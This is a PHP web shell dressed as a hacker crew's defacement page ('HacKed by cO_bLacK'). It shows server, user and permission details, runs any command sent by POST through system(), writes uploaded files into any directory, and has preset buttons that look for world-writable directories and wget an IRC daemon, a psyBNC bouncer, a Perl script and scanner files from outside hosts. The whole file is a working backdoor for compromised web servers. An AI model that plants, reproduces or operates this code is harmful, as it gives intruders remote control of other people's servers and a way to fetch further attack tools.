<html>
<head>
<body text="#00ff00" bgcolor="#000000">
<title>cO_bLacK</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<center><font face="trebuchet ms" size="4"><b> KERINCI CREW </b></p></center>
</style><head><body bgcolor="#000000"><center><img src="http://otomotif-crew.ucoz.com/gambar/rANdy.png">
<marquee behavior="alternate"><b><b>
<font color="white">--=[ HacKed by cO_bLacK ]=--</font></marquee></big></big></b></b><br>
</center>
<p><font face="comic sans MS" style="font-size: 9pt">
</font> 
  </p>
  <hr><hr>

  <p> <font face="comic sans MS" style="font-size: 9pt"><b>
  <br>
  
  </b>
  
</font><font face="comic sans MS">
  </p>
<div align="left"><b><?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span 

style="font-size: 9pt"><?= $info ?>
      <span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Info User:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid 

?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Permision Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; 

}else{ echo "No"; } ?>
    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Addres Server:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">User Script:</b> <?= $user ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
  </TR>
</TABLE>
</b>
</div></font></div>

<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "File" ) {
    $currentCMD = "ls -la";
}

if( $_POST['_act'] == "IP" ) {
    $currentCMD = "/sbin/ifconfig";
}

if( $_POST['_act'] == "Proses" ) {
    $currentCMD = "ps -wx";
}

if( $_POST['_act'] == "777" ) {
    $currentCMD = "find / -type d -perm 777";
}

if( $_POST['_act'] == "nobody" ) {
    $currentCMD = "find / -user nobody -type d";
}

if( $_POST['_act'] == "apache" ) {
    $currentCMD = "find / -user apache -type d";
}

if( $_POST['_act'] == "httpd" ) {
    $currentCMD = "find / -user httpd -type d";
}

if( $_POST['_act'] == "www" ) {
    $currentCMD = "find / -user www -type d";
}

if( $_POST['_act'] == "www-data" ) {
    $currentCMD = "find / -user www-data -type d";
}

if( $_POST['_act'] == "Unreal.3.2.1.8" ) {
    $currentCMD = "wget http://otomotif-crew.ucoz.com/program/Unreal3.2.8.1.tar.gz";
}

if( $_POST['_act'] == "rANdysCaNz" ) {
    $currentCMD = "wget http://otomotif-crew.ucoz.com/source/rANdysCaNz.txt";
}

if( $_POST['_act'] == "PERL" ) {
    $currentCMD = "wget http://kerincicrew.fileave.com/perl.txt";
}  

if( $_POST['_act'] == "rANdy" ) {
    $currentCMD = "wget http://kerincicrew.fileave.com/rANdy.jpg";
}  

if( $_POST['_act'] == "psyBNC" ) {
    $currentCMD = "wget http://otomotif-crew.ucoz.com/program/psy.tar";
}

print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";

print "<tr><td><b>Command:</b></td><td><input size=100 name=\"_cmd\" 

value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Aniaya\"></td></tr>";

print "<tr><td><b>Directory:</b></td><td><input size=100 name=\"_cwd\" 

value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"File\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=88 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload\"></td></tr>";

print "<tr><td><b>Find:</b></td>";
print "<td><input type=submit name=_act value=\"IP\"><b> <b><input type=submit name=_act 

value=\"Proses\"><b> <b><input type=submit name=_act value=\"777\"><b> <b><input type=submit 

name=_act value=\"nobody\"><b> <b><input type=submit name=_act value=\"apache\"><b> <b><input 

type=submit name=_act value=\"httpd\"><b> <b><input type=submit name=_act value=\"www\"><b> 

<b><input type=submit name=_act value=\"www-data\"></td></tr>";

print "<tr><td><b>rANdy aRea:</b></td>";
print "<td><input type=submit name=_act value=\"rANdysCaNz\"><b> <b><input type=submit name=_act 

value=\"PERL\"><b> <b><input type=submit name=_act 

value=\"psyBNC\"><b> <b><input type=submit name=_act value=\"Unreal.3.2.1.8\"><b> <b><input type=submit 

name=_act value=\"rANdy\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error Uplaoad Failed!!!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Upload File Succes!!!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>KERINCI CREW HACKER LINK</b></center>";
}

exit;

?>
